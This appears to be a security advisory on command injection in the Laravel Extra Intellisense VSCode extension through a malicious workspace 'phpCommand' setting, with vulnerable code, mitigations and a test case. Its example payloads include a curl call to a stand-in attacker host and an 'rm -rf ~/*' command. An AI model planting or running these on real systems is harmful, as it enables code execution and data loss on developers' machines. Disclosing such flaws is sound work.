### Vulnerability List

* Vulnerability Name: Command Injection via `phpCommand` configuration

    * Description:
        1. An attacker crafts a malicious Laravel repository.
        2. Within this repository, the attacker creates or modifies the VSCode workspace settings file (`.vscode/settings.json`).
        3. In this settings file, the attacker sets the `LaravelExtraIntellisense.phpCommand` configuration to a malicious command. This setting is intended to allow users to customize the PHP command used by the extension, but it is vulnerable to command injection. Examples of malicious commands include:
            -  `"LaravelExtraIntellisense.phpCommand": "php -r '{code}'; touch /tmp/pwned"` (Linux/macOS)
            -  `"LaravelExtraIntellisense.phpCommand": "php -r '{code}'; type nul > C:\pwned.txt"` (Windows)
            -  `"LaravelExtraIntellisense.phpCommand": "bash -c '{code}'"`
            -  `"LaravelExtraIntellisense.phpCommand": "php -r 'system(\"touch /tmp/pwned\"); {code}'"`
            -  `"LaravelExtraIntellisense.phpCommand": "bash -c 'touch command_injection_test.txt; {code}'"`
            -  `"LaravelExtraIntellisense.phpCommand": "bash -c 'curl https://attacker.example.com/pwned'"`
            -  `"LaravelExtraIntellisense.phpCommand": "bash -c 'rm -rf ~/*'"` (DANGEROUS - use with extreme caution in isolated VMs only)
            -  `"LaravelExtraIntellisense.phpCommand": "php -r \"{code}; system('calc');\""` (Windows - launches calculator)
        4. A victim, who has the "Laravel Extra Intellisense" extension installed in VSCode, opens this malicious Laravel repository.
        5. Upon opening the repository, VSCode loads the workspace settings, including the attacker's malicious `phpCommand` from `.vscode/settings.json`, overriding any user-level settings.
        6. When the extension attempts to provide autocompletion suggestions (for routes, views, configs, etc.) or perform other Laravel project analysis, it uses the configured `phpCommand` to execute PHP code within the Laravel application environment. This is done by calling the `runPhp` function in `src/helpers.ts`.
        7. The `runPhp` function substitutes the `{code}` placeholder in the user-configured `phpCommand` with dynamically generated PHP code required for the extension's functionality.
        8. Due to insufficient sanitization of the `phpCommand` configuration and the generated PHP code, the attacker's injected commands are executed by `child_process.exec` on the victim's system with the privileges of the VSCode process. The existing escaping mechanism is inadequate to prevent command injection, especially when using shell interpreters like `bash -c` or when injecting commands after the `{code}` placeholder.

    * Impact:
        Remote Code Execution (RCE). Successful exploitation allows the attacker to execute arbitrary shell commands on the victim's machine. This can lead to:
            - Full system compromise
            - Data exfiltration and theft of sensitive information
            - Installation of malware, ransomware, or backdoors
            - Denial of service
            - Privilege escalation
            - Lateral movement within a network

    * Vulnerability Rank: critical

    * Currently implemented mitigations:
        - None. The extension directly uses the `phpCommand` from the user configuration without any sanitization or validation.
        - The `runPhp` function in `src/helpers.ts` attempts to escape double quotes and some characters on Linux-like systems in the *generated PHP code* using `code = code.replace(/\"/g, "\\\"")` and similar replacements.
        ```typescript
        static async runPhp(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/\"/g, "\\\"");
            if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
                code = code.replace(/\$/g, "\\$");
                code = code.replace(/\\\\'/g, '\\\\\\\\\'');
                code = code.replace(/\\\\"/g, '\\\\\\\\\"');
            }
            // ...
        }
        ```
        - This mitigation is insufficient as it does not sanitize the `phpCommand` template itself, which is the source of the vulnerability. It also does not prevent injection when users configure `phpCommand` to use shell interpreters or inject commands outside the `{code}` placeholder.

    * Missing mitigations:
        - **Input sanitization and validation for `phpCommand` configuration**: The extension must sanitize and validate the `phpCommand` setting to prevent command injection. This could include:
            - Restricting allowed characters in the `phpCommand` setting to a safe subset.
            - Validating that the `phpCommand` starts with a safe executable like `php` and only allows a limited set of safe arguments.
            - Disallowing shell metacharacters and command separators.
        - **Restrict command template**: Instead of allowing users to define the entire command template, the extension should provide structured configuration options (e.g., path to PHP executable, Docker command, Sail/Laradock support) and construct the execution command internally using parameterized execution or by carefully escaping arguments when using `child_process.spawn`.
        - **Remove user configurability of `phpCommand`**: Consider removing the option for users to configure `phpCommand` altogether and rely on a fixed, secure command structure (e.g., always use `php -r "{code}"`). If customization is necessary, provide a limited and safe way to configure it.
        - **Use safer execution methods**: Explore using `child_process.spawn` instead of `child_process.exec` and construct the command arguments as an array to avoid shell injection.  Alternatively, investigate if there are Node.js libraries that allow for safer execution of PHP code without relying on shell commands.
        - **Security warnings**:
            - Display a prominent security warning in the extension's documentation, settings description, and potentially within VSCode itself when users attempt to modify the `phpCommand` setting, especially when workspace settings are overriding user settings.
            - Warn users about the risks of opening untrusted repositories and the potential for malicious workspace settings to compromise their system.
        - **Predefined configurations**: Provide predefined, secure configurations for common environments like Docker, Sail, and Laradock, and guide users to use these instead of directly modifying `phpCommand`.

    * Preconditions:
        - The victim must have the "Laravel Extra Intellisense" extension installed in VSCode.
        - The victim must open a malicious Laravel repository in VSCode.
        - The malicious repository must contain a `.vscode/settings.json` file that maliciously overrides the `LaravelExtraIntellisense.phpCommand` setting.
        - The extension must activate and attempt to use the configured `phpCommand`, which typically happens automatically when opening a Laravel project or a PHP file within such a project, or when triggering autocompletion features.

    * Source code analysis:
        - File: `src/helpers.ts`
        - Function: `runPhp(code: string, description: string|null = null)`
        - Vulnerable code snippet:
        ```typescript
        static async runPhp(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/\"/g, "\\\"");
            if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
                code = code.replace(/\$/g, "\\$");
                code = code.replace(/\\\\'/g, '\\\\\\\\\'');
                code = code.replace(/\\\\"/g, '\\\\\\\\\"');
            }
            let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // [LINE 7] - Retrieves phpCommand from configuration
            let command = commandTemplate.replace("{code}", code); // [LINE 8] - Constructs the command string by replacing {code}
            let out = new Promise<string>(function (resolve, error) { // [LINE 9]
                if (description != null) { // [LINE 10]
                    Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description); // [LINE 11]
                } // [LINE 12]

                cp.exec(command, // [LINE 13] - Executes the command using child_process.exec - VULNERABILITY
                    { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined }, // [LINE 14]
                    function (err, stdout, stderr) { // [LINE 15]
                        // ...
                    } // [LINE 27]
                ); // [LINE 28]
            }); // [LINE 29]
            return out; // [LINE 30]
        }
        ```
        - **Line 7**: The `phpCommand` setting is retrieved directly from VSCode configuration using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand')`. This setting is user-configurable and can be overridden by workspace settings in `.vscode/settings.json`.
        - **Line 8**: The `command` string is constructed by simply replacing the `{code}` placeholder in the `commandTemplate` with the `$code` variable. No sanitization or validation is performed on the `commandTemplate` itself.
        - **Line 13**: `cp.exec(command, ...)` executes the constructed `command` string using `child_process.exec`. `cp.exec` executes a command in a shell, which interprets shell metacharacters, making it vulnerable to command injection if the `command` string is not properly sanitized, especially when derived from user-controlled settings like `phpCommand`. The limited escaping performed on lines 1-5 is insufficient to prevent command injection via the `phpCommand` template.

    * Security test case:
        1. **Setup:**
            - Install the "Laravel Extra Intellisense" extension in VSCode.
            - Create a new directory named `rce-test-project`.
            - Inside `rce-test-project`, create a subdirectory named `.vscode`.
            - Inside `.vscode`, create a file named `settings.json` with the following content to inject a malicious command (e.g., opening calculator on Windows):
            ```json
            {
                "LaravelExtraIntellisense.phpCommand": "php -r \"{code}; system('calc.exe');\""
            }
            ```
            - Create a dummy PHP file named `test.php` in `rce-test-project` with the following content:
            ```php
            <?php
            // Empty PHP file
            ```
        2. **Execution:**
            - Open the `rce-test-project` directory in VSCode.
            - Open the `test.php` file. This action, or triggering any autocompletion feature of the extension (e.g., typing `route(` in a Blade or PHP file), will cause the extension to execute PHP code using the configured `phpCommand`.
        3. **Verification:**
            - Observe if the Windows Calculator application (or equivalent on other operating systems if you adapted the command) is launched shortly after opening `test.php` or triggering autocompletion.
            - If the calculator launches, it confirms successful command injection and Remote Code Execution.
            - For a less intrusive test, replace `system('calc.exe');` with `system('touch /tmp/pwned_by_vscode_extension');` (or `system('type nul > C:\pwned_by_vscode_extension.txt');` on Windows) and check if the file `/tmp/pwned_by_vscode_extension` (or `C:\pwned_by_vscode_extension.txt`) is created after triggering the extension.
        4. **Attacker Perspective (External Threat Actor):**
            - An attacker would create a seemingly legitimate Laravel project repository on a platform like GitHub, including the malicious `.vscode/settings.json` file.
            - The attacker would then entice Laravel developers to clone and open this repository in VSCode.
            - Once the victim opens the project, the malicious settings are automatically loaded by VSCode, and upon the extension's activation and execution of PHP code, the attacker's injected commands are executed on the victim's machine without any further interaction needed from the attacker after the victim opens the project.
